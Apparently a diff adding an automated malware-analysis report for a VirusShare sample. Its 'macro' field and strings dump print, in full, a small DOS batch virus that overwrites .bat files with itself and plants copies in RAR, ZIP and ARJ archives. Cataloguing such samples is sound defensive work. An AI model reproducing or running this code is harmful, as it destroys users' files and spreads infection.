@@ -1,0 +1,39 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {},
+        "macro": "@echo off\nfor %%d in (*.bat) do set B=%%d\nmove %B% c:\\helps.ini\ncopy %0 %B%\nfor %%f in (*.rar *.zip *.arj) do attrib -r %%f\nfor %%r in (*.rar) do rar a -tk -y -c- -o+ %%r %0\nfor %%z in (*.zip) do pkzip -m %%z %0\nfor %%a in (*.arj) do arj a -d %%a %0"
+    },
+    "filename": "VirusShare_47330bb7898d46e8e019fe121ea5dc4c",
+    "filesize": 258,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "47330bb7898d46e8e019fe121ea5dc4c",
+        "sha1": "df2a47e02b20b12f1bbd193fcd33d30abb24425c",
+        "sha256": "355f592bd2b5187486929c6c3e897912a86775fe7d4c2b64b183bcddbc59236c"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off",
+            "for %%d in (*.bat) do set B=%%d",
+            "move %B% c:\\helps.ini",
+            "copy %0 %B%",
+            "for %%f in (*.rar *.zip *.arj) do attrib -r %%f",
+            "for %%r in (*.rar) do rar a -tk -y -c- -o+ %%r %0",
+            "for %%z in (*.zip) do pkzip -m %%z %0",
+            "for %%a in (*.arj) do arj a -d %%a %0"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.249756",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
